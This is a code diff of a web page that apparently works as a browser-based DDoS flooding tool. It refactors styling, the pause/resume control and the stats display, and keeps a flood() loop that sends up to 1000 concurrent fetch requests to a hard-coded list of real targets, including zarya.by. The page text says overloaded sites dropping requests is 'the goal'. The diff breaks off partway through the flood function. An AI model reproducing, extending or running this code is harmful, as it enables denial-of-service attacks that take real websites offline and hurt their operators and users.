@@ -38,11 +38,6 @@
       text-align: justify;
     }
 
-    .footer {
-      margin-top: 2rem;
-      text-align: center;
-    }
-
     .desc {
       margin: 0 auto;
       padding: 2rem 0;
@@ -51,24 +46,13 @@
       font-weight: bold;
     }
 
-    .desc h3 {
-      text-align: center;
-      color: #0057b7;
-    }
-
-    #stats h4 {
-      font-size: 1.1em;
-      text-decoration: underline;
-      color: #0057b7;
-      font-weight: 400;
-    }
-
-    table.status {
-      margin-bottom: 10px;
-    }
-
     table {
       width: 100%;
+    }
+
+    .footer {
+      margin-top: 2rem;
+      text-align: center;
     }
   </style>
 
@@ -142,9 +126,8 @@
       <p class="desc">Below are the stats of your session (URLs and requests that were sent from your browser)<br>
         Sites with the "Failed to fetch" error message are dropping packets due to heavy load, which is the goal!<br>
         A high number of errored responses may be due to a DDoS protection service.</p>
-      <button type="button" class="btn btn-primary" onclick="togglePause();">Pause</button>
+      <button id="pause-resume" type="button" class="btn btn-primary" onclick="togglePause();">Pause</button>
     </div>
-
 
     <div>
       <table>
@@ -157,6 +140,7 @@
           </tr>
         </thead>
         <tbody id="stats"></tbody>
+        <tfoot id="stats-total"></tfoot>
       </table>
     </div>
 
@@ -429,40 +413,41 @@
       'https://zarya.by/'
     ]
     var targetStats = {}; targetList.forEach(target => { targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0, error_message: '' } })
-    var total_requests = 0
-    var total_errors = 0
-    var CONCURRENCY_LIMIT = 1000
-    var timeout = 2000
-    var queue = []
-    var attack = true
+    var total_requests = 0, total_errors = 0, attack = true, queue = []
 
-    // Warning
+    // Settings
+    var update_interval = 1000
+    var concurrency_limit = 1000
+    var fetch_timeout = 2000
+
+    // Warning popup
     var myModal = new bootstrap.Modal(document.getElementById('warning'), {}); myModal.toggle()
     window.onload = togglePause()
 
     function togglePause() {
       if (attack) {
         attack = false
-        document.querySelector("div.desc .btn").innerText = "Resume";
+        document.getElementById('pause-resume').innerText = 'Resume'
       } else {
         attack = true
-        document.querySelector("div.desc .btn").innerText = "Pause";
+        document.getElementById('pause-resume').innerText = 'Pause'
         targetList.map(flood)
       }
     }
 
     // Update stats
     setInterval(() => {
-      document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td><td>' + error_message + '</td></tr>').join('') + `<tr><td style="font-weight:bold">Total Stats:</td><td>${total_requests}</td><td>${total_errors}</td><td></td></tr>`
-    }, 1000)
+      document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => `<tr><td>${target}</td><td>${number_of_requests}</td><td>${number_of_errored_responses}</td><td>${error_message}</td></tr>`).join('')
+      document.getElementById('stats-total').innerHTML = `<tr><td style="font-weight:bold">Total Stats:</td><td>${total_requests}</td><td>${total_errors}</td><td></td></tr>`
+    }, update_interval)
 
     async function flood(target) {
       while (attack) {
-        if (queue.length > CONCURRENCY_LIMIT) {
+        if (queue.length > concurrency_limit) {
           await queue.shift()
         }
         queue.push(
-          fetchWithTimeout(target, { timeout: timeout })
+          fetchWithTimeout(target, { timeout: fetch_timeout })
             .catch((error) => {
               if (error.code === 20) { return } // ABORT
               targetStats[target].number_of_errored_responses++
